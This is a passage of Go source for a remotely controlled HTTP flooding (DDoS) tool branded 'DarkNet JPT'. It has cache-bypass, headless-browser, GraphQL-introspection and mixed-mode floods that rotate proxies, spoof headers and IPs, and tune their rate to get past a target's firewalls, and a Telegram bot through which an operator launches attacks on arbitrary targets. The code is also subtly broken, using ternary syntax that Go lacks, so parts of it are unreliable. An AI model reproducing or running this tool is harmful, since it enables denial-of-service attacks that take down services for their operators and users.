				headerKeys := make([]string, 0, len(headers))
				for k := range headers {
					headerKeys = append(headerKeys, k)
				}
				rand.Shuffle(len(headerKeys), func(i, j int) {
					headerKeys[i], headerKeys[j] = headerKeys[j], headerKeys[i]
				})
				for _, k := range headerKeys {
					req.Header.Set(k, headers[k])
				}
				if options.hcookie != "" {
					req.Header.Set("Cookie", options.hcookie)
				}
				if options.refererValue != "" {
					req.Header.Set("Referer", options.refererValue)
				}
				if options.customHeaders != "" {
					for _, header := range strings.Split(options.customHeaders, "#") {
						parts := strings.SplitN(header, "=", 2)
						if len(parts) == 2 {
							req.Header.Set(parts[0], parts[1])
						}
					}
				}
				if reqmethod == "POST" {
					req.SetBody([]byte(generatePostData(options)))
				}
				req.Header.Set("Host", parsed.Host)
				req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
				req.Header.Set("Accept-Encoding", options.compression)
				req.Header.Set("Cache-Control", "no-cache")
				req.Header.Set("Pragma", "no-cache")
				req.Header.Set("Connection", "keep-alive")
				resp := fasthttp.AcquireResponse()
				err := client.DoTimeout(req, resp, 10*time.Second)
				atomic.AddInt64(&totalRequests, 1)
				networkUsage += float64(len(req.String()))
				if err != nil {
					log.Printf("[DarkNet JPT] [WARN] Cache bypass request error: %v", err)
					atomic.AddInt64(&failedRequests, 1)
					updateProxyStats(proxy, 0, 1, 0)
					logStatsToFile()
					fasthttp.ReleaseRequest(req)
					fasthttp.ReleaseResponse(resp)
					continue
				}
				if len(resp.Body()) > 1024*1024 {
					log.Printf("[DarkNet JPT] [WARN] Response too large: %d bytes", len(resp.Body()))
					fasthttp.ReleaseRequest(req)
					fasthttp.ReleaseResponse(resp)
					continue
				}
				status := fmt.Sprintf("%d", resp.StatusCode())
				log.Printf("[DarkNet JPT] [SEND] %s ...", status)
				mutex.Lock()
				statusCodeStats[status]++
				if status == "403" || status == "429" {
					blockedProxies[proxy] = true
					log.Printf("[DarkNet JPT] [WARN] Proxy %s blocked by target firewall", proxy)
				}
				mutex.Unlock()
				if slices.Contains([]string{"200", "201", "202"}, status) {
					atomic.AddInt64(&successRequests, 1)
				} else {
					atomic.AddInt64(&failedRequests, 1)
				}
				updateProxyStats(proxy, slices.Contains([]string{"200", "201", "202"}, status)?1:0, !slices.Contains([]string{"200", "201", "202"}, status)?1:0, len(resp.Body()))
				logStatsToFile()
				fasthttp.ReleaseRequest(req)
				fasthttp.ReleaseResponse(resp)
			}
			if options.autorate && bot.successRate < 0.5 {
				newRate := int64(float64(currentRate) * 0.8)
				if newRate < 10 {
					newRate = 10
				}
				atomic.StoreInt64(&bot.currentRate, newRate)
			} else if options.autorate && bot.successRate > 0.9 {
				newRate := int64(float64(currentRate) * 1.2)
				if newRate > int64(options.rate*2) {
					newRate = int64(options.rate * 2)
				}
				atomic.StoreInt64(&bot.currentRate, newRate)
			}
			time.Sleep(getPoissonInterval(float64(currentRate) / 1000))
		}
	}()
	bypassCache := func() {
		if rand.Float64() < 0.3 {
			headers := generateBrowserConfig("random")
			headers["X-Forwarded-For"] = generateRandomIP()
			req := fasthttp.AcquireRequest()
			req.SetRequestURI(target + parsed.Path + fmt.Sprintf("?cb=%s", generateRandomString(16, 16)))
			req.Header.SetMethod("GET")
			headerKeys := make([]string, 0, len(headers))
			for k := range headers {
				headerKeys = append(headerKeys, k)
			}
			rand.Shuffle(len(headerKeys), func(i, j int) {
				headerKeys[i], headerKeys[j] = headerKeys[j], headerKeys[i]
			})
			for _, k := range headerKeys {
				req.Header.Set(k, headers[k])
			}
			client.DoTimeout(req, nil, 10*time.Second)
			fasthttp.ReleaseRequest(req)
		}
	}
	go bypassCache()
}

func headlessAttack(proxy, target, reqmethod string, rate int, options Options, bot *Bot) {
	parsed, err := url.Parse(target)
	if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") || parsed.Host == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid URL: %s", target)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	parts := strings.Split(proxy, ":")
	if len(parts) != 2 {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy format: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	proxyHost, proxyPort := parts[0], parts[1]
	if proxyHost == "" || proxyPort == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy host or port: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	if rate <= 0 {
		log.Printf("[DarkNet JPT] [WARN] Invalid rate: %d. Defaulting to 100", rate)
		rate = 100
	}
	ctx, cancel := chromedp.NewContext(
		context.Background(),
		chromedp.WithTargetAllocator(
			chromedp.NewExecAllocator(
				context.Background(),
				chromedp.ProxyServer("http://" + proxyHost + ":" + proxyPort),
			),
		),
	)
	defer cancel()
	wg.Add(1)
	go func() {
		defer wg.Done()
		currentRate := int64(rate)
		if options.autorate {
			currentRate = atomic.LoadInt64(&bot.currentRate)
		}
		for {
			for j := 0; j < int(currentRate); j++ {
				path := parsed.Path
				if parsed.RawQuery != "" {
					path += "?" + parsed.RawQuery
				}
				if options.randomstring != "" {
					path = strings.ReplaceAll(path, "%RAND%", ra()) + fmt.Sprintf("?%s=%s", options.randomstring, generateRandomString(12, 12))
				} else {
					path = strings.ReplaceAll(path, "%RAND%", ra())
				}
				url := target + path
				err := chromedp.Run(ctx,
					chromedp.Navigate(url),
					chromedp.Sleep(time.Second*time.Duration(rand.Intn(2)+1)),
					chromedp.Evaluate(`window.scrollTo(0, document.body.scrollHeight);`, nil),
				)
				if err != nil {
					log.Printf("[DarkNet JPT] [WARN] Headless navigation error: %v", err)
					atomic.AddInt64(&failedRequests, 1)
					updateProxyStats(proxy, 0, 1, 0)
					logStatsToFile()
					continue
				}
				atomic.AddInt64(&totalRequests, 1)
				networkUsage += 1000
				log.Printf("[DarkNet JPT] [SEND] Headless navigation ...")
				atomic.AddInt64(&successRequests, 1)
				updateProxyStats(proxy, 1, 0, 1000)
				logStatsToFile()
			}
			if options.autorate && bot.successRate < 0.5 {
				newRate := int64(float64(currentRate) * 0.8)
				if newRate < 10 {
					newRate = 10
				}
				atomic.StoreInt64(&bot.currentRate, newRate)
			} else if options.autorate && bot.successRate > 0.9 {
				newRate := int64(float64(currentRate) * 1.2)
				if newRate > int64(options.rate*2) {
					newRate = int64(options.rate * 2)
				}
				atomic.StoreInt64(&bot.currentRate, newRate)
			}
			time.Sleep(getPoissonInterval(float64(currentRate) / 1000))
		}
	}()
	bypassHeadless := func() {
		if rand.Float64() < 0.3 {
			ctx, cancel := chromedp.NewContext(
				context.Background(),
				chromedp.WithTargetAllocator(
					chromedp.NewExecAllocator(
						context.Background(),
						chromedp.ProxyServer("http://" + proxyHost + ":" + proxyPort),
					),
				),
			)
			defer cancel()
			chromedp.Run(ctx, chromedp.Navigate(target+"?"+generateRandomString(16, 16)))
		}
	}
	go bypassHeadless()
}

func introspectionAttack(proxy, target, reqmethod string, rate int, options Options, bot *Bot) {
	parsed, err := url.Parse(target)
	if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") || parsed.Host == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid URL: %s", target)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	parts := strings.Split(proxy, ":")
	if len(parts) != 2 {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy format: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	proxyHost, proxyPort := parts[0], parts[1]
	if proxyHost == "" || proxyPort == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy host or port: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	if rate <= 0 {
		log.Printf("[DarkNet JPT] [WARN] Invalid rate: %d. Defaulting to 100", rate)
		rate = 100
	}
	queryDepth := options.queryDepth
	if queryDepth == 0 {
		queryDepth = 3
	}
	graphqlQuery := fmt.Sprintf(`query IntrospectionQuery%s { __schema { types { name fields(includeDeprecated: true) { name args { name type { name kind ofType { name kind } } } } } } }`, ra())
	for i := 1; i < queryDepth; i++ {
		graphqlQuery = fmt.Sprintf(`query IntrospectionQuery%s { __schema { types { name fields(includeDeprecated: true) { name args { name type { name kind ofType { name kind } } } } } } }`, ra())
	}
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig:     randomizeTLSConfig(),
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 10,
			IdleConnTimeout:     30 * time.Second,
			Proxy: http.ProxyURL(&url.URL{
				Scheme: "http",
				Host:   proxyHost + ":" + proxyPort,
			}),
		},
		Timeout: 10 * time.Second,
	}
	wg.Add(1)
	go func() {
		defer wg.Done()
		currentRate := int64(rate)
		if options.autorate {
			currentRate = atomic.LoadInt64(&bot.currentRate)
		}
		for {
			for j := 0; j < int(currentRate); j++ {
				path := parsed.Path
				if parsed.RawQuery != "" {
					path += "?" + parsed.RawQuery
				}
				if options.randomstring != "" {
					path = strings.ReplaceAll(path, "%RAND%", ra()) + fmt.Sprintf("?%s=%s", options.randomstring, generateRandomString(12, 12))
				} else {
					path = strings.ReplaceAll(path, "%RAND%", ra())
				}
				headers := generateBrowserConfig(options.fingerprint)
				headers["Host"] = parsed.Host
				headers["Accept"] = "application/json"
				headers["Content-Type"] = "application/json"
				headers["Accept-Encoding"] = options.compression
				headers["Connection"] = "keep-alive"
				if options.hcookie != "" {
					headers["Cookie"] = options.hcookie
				}
				if options.refererValue != "" {
					headers["Referer"] = options.refererValue
				}
				if options.customHeaders != "" {
					for _, header := range strings.Split(options.customHeaders, "#") {
						parts := strings.SplitN(header, "=", 2)
						if len(parts) == 2 {
							headers[parts[0]] = parts[1]
						}
					}
				}
				postData, err := json.Marshal(map[string]string{"query": graphqlQuery})
				if err != nil {
					log.Printf("[DarkNet JPT] [WARN] JSON marshal error: %v", err)
					continue
				}
				req, _ := http.NewRequest("POST", target+path, bytes.NewReader(postData))
				headerKeys := make([]string, 0, len(headers))
				for k := range headers {
					headerKeys = append(headerKeys, k)
				}
				rand.Shuffle(len(headerKeys), func(i, j int) {
					headerKeys[i], headerKeys[j] = headerKeys[j], headerKeys[i]
				})
				for _, k := range headerKeys {
					req.Header.Set(k, headers[k])
				}
				resp, err := client.Do(req)
				atomic.AddInt64(&totalRequests, 1)
				networkUsage += float64(len(postData))
				if err != nil {
					log.Printf("[DarkNet JPT] [WARN] Introspection request error: %v", err)
					atomic.AddInt64(&failedRequests, 1)
					updateProxyStats(proxy, 0, 1, 0)
					logStatsToFile()
					continue
				}
				defer resp.Body.Close()
				data, _ := io.ReadAll(resp.Body)
				if len(data) > 1024*1024 {
					log.Printf("[DarkNet JPT] [WARN] Response too large: %d bytes", len(data))
					continue
				}
				status := fmt.Sprintf("%d", resp.StatusCode)
				log.Printf("[DarkNet JPT] [SEND] %s ...", status)
				mutex.Lock()
				statusCodeStats[status]++
				if status == "403" || status == "429" {
					blockedProxies[proxy] = true
					log.Printf("[DarkNet JPT] [WARN] Proxy %s blocked by target firewall", proxy)
				}
				mutex.Unlock()
				if slices.Contains([]string{"200", "201", "202"}, status) {
					atomic.AddInt64(&successRequests, 1)
				} else {
					atomic.AddInt64(&failedRequests, 1)
				}
				updateProxyStats(proxy, slices.Contains([]string{"200", "201", "202"}, status)?1:0, !slices.Contains([]string{"200", "201", "202"}, status)?1:0, len(data))
				logStatsToFile()
			}
			if options.autorate && bot.successRate < 0.5 {
				newRate := int64(float64(currentRate) * 0.8)
				if newRate < 10 {
					newRate = 10
				}
				atomic.StoreInt64(&bot.currentRate, newRate)
			} else if options.autorate && bot.successRate > 0.9 {
				newRate := int64(float64(currentRate) * 1.2)
				if newRate > int64(options.rate*2) {
					newRate = int64(options.rate * 2)
				}
				atomic.StoreInt64(&bot.currentRate, newRate)
			}
			time.Sleep(getPoissonInterval(float64(currentRate) / 1000))
		}
	}()
	bypassIntrospection := func() {
		if rand.Float64() < 0.3 {
			headers := generateBrowserConfig("random")
			headers["X-Forwarded-For"] = generateRandomIP()
			headers["Content-Type"] = "application/json"
			postData, _ := json.Marshal(map[string]string{"query": fmt.Sprintf("query { ping%s }", ra())})
			req, _ := http.NewRequest("POST", target+parsed.Path, bytes.NewReader(postData))
			headerKeys := make([]string, 0, len(headers))
			for k := range headers {
				headerKeys = append(headerKeys, k)
			}
			rand.Shuffle(len(headerKeys), func(i, j int) {
				headerKeys[i], headerKeys[j] = headerKeys[j], headerKeys[i]
			})
			for _, k := range headerKeys {
				req.Header.Set(k, headers[k])
			}
			client.Do(req)
		}
	}
	go bypassIntrospection()
}

func mixedModeAttack(proxy, target, reqmethod string, rate int, options Options, bot *Bot) {
	parsed, err := url.Parse(target)
	if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") || parsed.Host == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid URL: %s", target)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	parts := strings.Split(proxy, ":")
	if len(parts) != 2 {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy format: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	proxyHost, proxyPort := parts[0], parts[1]
	if proxyHost == "" || proxyPort == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy host or port: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	if rate <= 0 {
		log.Printf("[DarkNet JPT] [WARN] Invalid rate: %d. Defaulting to 100", rate)
		rate = 100
	}
	modes := bot.combinedModes
	if len(modes) == 0 {
		modes = validModes[:len(validModes)-1] // Exclude mixed mode itself
	}
	thresholds := make([]int, len(modes))
	for i := range thresholds {
		thresholds[i] = int(options.mixRatio[modes[i]] * float64(rate))
		if thresholds[i] == 0 {
			thresholds[i] = rate / len(modes)
		}
	}
	wg.Add(len(modes))
	for i, mode := range modes {
		go func(mode string, threshold int) {
			defer wg.Done()
			switch mode {
			case "tls":
				tlsAttack(proxy, target, reqmethod, threshold, options, bot)
			case "http2":
				http2Attack(proxy, target, reqmethod, threshold, options, bot)
			case "h2multi":
				h2multiAttack(proxy, target, reqmethod, threshold, options, bot)
			case "graphql":
				graphqlAttack(proxy, target, reqmethod, threshold, options, bot)
			case "rapid":
				rapidResetAttack(proxy, target, reqmethod, threshold, options, bot)
			case "api":
				apiAttack(proxy, target, reqmethod, threshold, options, bot)
			case "http3":
				http3Attack(proxy, target, reqmethod, threshold, options, bot)
			case "ws":
				wsAttack(proxy, target, reqmethod, threshold, options, bot)
			case "cachebypass":
				cacheBypassAttack(proxy, target, reqmethod, threshold, options, bot)
			case "headless":
				headlessAttack(proxy, target, reqmethod, threshold, options, bot)
			case "introspection":
				introspectionAttack(proxy, target, reqmethod, threshold, options, bot)
			}
		}(mode, thresholds[i])
	}
	bypassMixed := func() {
		if rand.Float64() < 0.3 {
			client := &http.Client{
				Transport: &http.Transport{
					TLSClientConfig:     randomizeTLSConfig(),
					MaxIdleConns:        100,
					MaxIdleConnsPerHost: 10,
					IdleConnTimeout:     30 * time.Second,
					Proxy: http.ProxyURL(&url.URL{
						Scheme: "http",
						Host:   proxyHost + ":" + proxyPort,
					}),
				},
				Timeout: 10 * time.Second,
			}
			headers := generateBrowserConfig("random")
			headers["X-Forwarded-For"] = generateRandomIP()
			req, _ := http.NewRequest("GET", target+parsed.Path+"?"+generateRandomString(16, 16), nil)
			headerKeys := make([]string, 0, len(headers))
			for k := range headers {
				headerKeys = append(headerKeys, k)
			}
			rand.Shuffle(len(headerKeys), func(i, j int) {
				headerKeys[i], headerKeys[j] = headerKeys[j], headerKeys[i]
			})
			for _, k := range headerKeys {
				req.Header.Set(k, headers[k])
			}
			client.Do(req)
		}
	}
	go bypassMixed()
}

func telegram_bot_start(bot *Bot) {
	tgbot, err := tgbotapi.NewBotAPI("YOUR_TELEGRAM_BOT_TOKEN")
	if err != nil {
		log.Printf("[DarkNet JPT] [ERROR] Telegram bot initialization error: %v", err)
		return
	}
	tgbot.Debug = false
	updateConfig := tgbotapi.NewUpdate(0)
	updateConfig.Timeout = 60
	updates := tgbot.GetUpdatesChan(updateConfig)
	for update := range updates {
		if update.Message == nil {
			continue
		}
		if !update.Message.IsCommand() {
			continue
		}
		msg := tgbotapi.NewMessage(update.Message.Chat.ID, "")
		switch update.Message.Command() {
		case "status":
			mutex.Lock()
			total := atomic.LoadInt64(&totalRequests)
			success := atomic.LoadInt64(&successRequests)
			failed := atomic.LoadInt64(&failedRequests)
			rps := float64(total) / (float64(time.Now().UnixNano()/1e6-startTime) / 1000)
			successRate := float64(success) / float64(total+1)
			bot.successRate = successRate
			proxyAlive := float64(len(bot.proxyList)-len(blockedProxies)) / float64(len(bot.proxyList)+1) * 100
			stats := map[string]interface{}{
				"total_requests":   total,
				"success_requests": success,
				"failed_requests":  failed,
				"rps":              rps,
				"success_rate":     successRate,
				"network_usage":    networkUsage,
				"proxy_alive_%":    proxyAlive,
				"blocked_proxies":  len(blockedProxies),
				"status_codes":     statusCodeStats,
			}
			data, _ := json.MarshalIndent(stats, "", "  ")
			msg.Text = string(data)
			mutex.Unlock()
			logStatsToFile()
		case "attack":
			if bot.options.botauto {
				args := update.Message.CommandArguments()
				parts := strings.Fields(args)
				if len(parts) < 3 {
					msg.Text = "Usage: /attack <target> <method> <rate>"
					tgbot.Send(msg)
					continue
				}
				target := parts[0]
				reqmethod := parts[1]
				rate, _ := strconv.Atoi(parts[2])
				proxy := bot.proxyList[bot.currentProxyIndex%len(bot.proxyList)]
				bot.currentProxyIndex++
				if slices.Contains(validModes, bot.mode) {
					switch bot.mode {
					case "tls":
						go tlsAttack(proxy, target, reqmethod, rate, bot.options, bot)
					case "http2":
						go http2Attack(proxy, target, reqmethod, rate, bot.options, bot)
					case "h2multi":
						go h2multiAttack(proxy, target, reqmethod, rate, bot.options, bot)
					case "graphql":
						go graphqlAttack(proxy, target, reqmethod, rate, bot.options, bot)
					case "rapid":
						go rapidResetAttack(proxy, target, reqmethod, rate, bot.options, bot)
					case "api":
						go apiAttack(proxy, target, reqmethod, rate, bot.options, bot)
					case "http3":
						go http3Attack(proxy, target, reqmethod, rate, bot.options, bot)
					case "ws":
						go wsAttack(proxy, target, reqmethod, rate, bot.options, bot)
					case "cachebypass":
						go cacheBypassAttack(proxy, target, reqmethod, rate, bot.options, bot)
					case "headless":
						go headlessAttack(proxy, target, reqmethod, rate, bot.options, bot)
					case "introspection":
						go introspectionAttack(proxy, target, reqmethod, rate, bot.options, bot)
					case "mixed":
						go mixedModeAttack(proxy, target, reqmethod, rate, bot.options, bot)
					}
					msg.Text = fmt.Sprintf("Attack started: %s %s %d", target, reqmethod, rate)
				} else {
					msg.Text = fmt.Sprintf("Invalid mode: %s", bot.mode)
				}
			} else {
				msg.Text = "Bot auto mode is disabled"
			}
		default:
			msg.Text = "Unknown command. Available: /status, /attack"
		}
		tgbot.Send(msg)
	}
}
